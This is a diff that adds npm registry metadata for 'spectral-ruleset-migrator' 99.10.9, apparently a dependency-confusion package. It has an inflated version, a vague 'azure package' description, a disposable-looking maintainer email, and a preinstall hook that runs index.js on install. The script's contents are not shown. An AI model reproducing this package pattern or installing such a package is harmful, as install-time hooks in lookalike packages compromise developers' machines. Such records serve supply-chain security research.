@@ -1,0 +1,62 @@
+{
+    "_id": "spectral-ruleset-migrator",
+    "name": "spectral-ruleset-migrator",
+    "dist-tags": {
+        "latest": "99.10.9"
+    },
+    "versions": {
+        "99.10.9": {
+            "name": "spectral-ruleset-migrator",
+            "version": "99.10.9",
+            "description": "azure package",
+            "main": "index.js",
+            "scripts": {
+                "test": "echo 'error no test specified' && exit 1",
+                "preinstall": "node index.js"
+            },
+            "author": "",
+            "License": "ISC",
+            "_id": "spectral-ruleset-migrator@99.10.9",
+            "_nodeVersion": "16.14.2",
+            "_npmVersion": "8.5.0",
+            "dist": {
+                "integrity": "sha512-bMdRcghHS/HA8+OWW1wpZSVL2XfwMqdsdAaRvExuiDrJWh9dO70OPCx7pJjVzWjs/0hwk9n8qP8PTXlKybfxUg==",
+                "shasum": "d5ff6c03d7137cb6da8975799edaef95d8ef4383",
+                "tarball": "https://registry.npmjs.org/spectral-ruleset-migrator/-/spectral-ruleset-migrator-99.10.9.tgz",
+                "fileCount": 2,
+                "unpackedSize": 5077,
+                "npm-signature": "-----BEGIN PGP SIGNATURE-----\r\nVersion: OpenPGP.js v4.10.10\r\nComment: https://openpgpjs.org\r\n\r\nwsFzBAEBCAAGBQJiO8R9ACEJED1NWxICdlZqFiEECWMYAoorWMhJKdjhPU1b\r\nEgJ2VmrmAQ/9HZae4dMVMhXz1JADFSPmdKpvvXd99IsUdtBZciWn0AjO553N\r\nvulZmLoDFyoaj8l8Adgp/X4xSbodoguT+yxdDn5FGI3Pbzo5KoAs+bbWe8RT\r\npLQCnSaGszQkVR/FIqME3IzQAF4FUAp9vOImkDEu+TOhALiVmCUZeotrE4cQ\r\nmdzgjrMlMv4+Z36SuXyWsY9UkVnj6FKLs/FdWEiEL6q723KCkBjQTOoHhj/p\r\n1qK7OGIZSS6as9qcXMqfPeQfHeJgv8wMIDJNkJyVHnMLL2qgEQLIl83g6jXc\r\n8/F/UUlDueq0hI6bnPatKG+lYoiEd4huIxLXsJqNtc/Vwv7GUFWAj5btwDpN\r\n2MOaukQZV9JNqQU63NcEaGdvYDLCn/iLSbRWRrWM/1karXMa+OUM4D/NqaAT\r\nLOa0ZwQeXmqdNapzccHGr6gyiTAmA8Nm9rNnMh1Yb6Twv6RRdJIHgP77jztj\r\nEr8ZYJOdkKmoxk3/gugzjb+8BnkUeZfH4vm5WlJ0NwQ6vKqKedBrTAszl9Pr\r\nAUmwG6BLazwtU7QuB3l5eMGQyYJxkkVgN5iH8+8uxThDkx1blyI6EQDDtrvf\r\nzL9ABToI/gpFJDXh1SYB8kvjDSolKFaLWWqBr2XKnwWq7y053H5oPAFrxiql\r\nM2cJQk6DpT855xwwEA1+6qJh+5EVQBJAo1k=\r\n=bGlN\r\n-----END PGP SIGNATURE-----\r\n"
+            },
+            "_npmUser": {
+                "name": "spjyttcx",
+                "email": "spjyttcx@rt11.ml"
+            },
+            "directories": {},
+            "maintainers": [
+                {
+                    "name": "spjyttcx",
+                    "email": "spjyttcx@rt11.ml"
+                }
+            ],
+            "_npmOperationalInternal": {
+                "host": "s3://npm-registry-packages",
+                "tmp": "tmp/spectral-ruleset-migrator_99.10.9_1648084092961_0.5010366919420357"
+            },
+            "_hasShrinkwrap": false
+        }
+    },
+    "time": {
+        "created": "2022-03-24T01:08:12.961Z",
+        "99.10.9": "2022-03-24T01:08:13.114Z",
+        "modified": "2022-03-24T01:08:13.262Z"
+    },
+    "maintainers": [
+        {
+            "name": "spjyttcx",
+            "email": "spjyttcx@rt11.ml"
+        }
+    ],
+    "description": "azure package",
+    "readme": "ERROR: No README data found!",
+    "readmeFilename": ""
+}
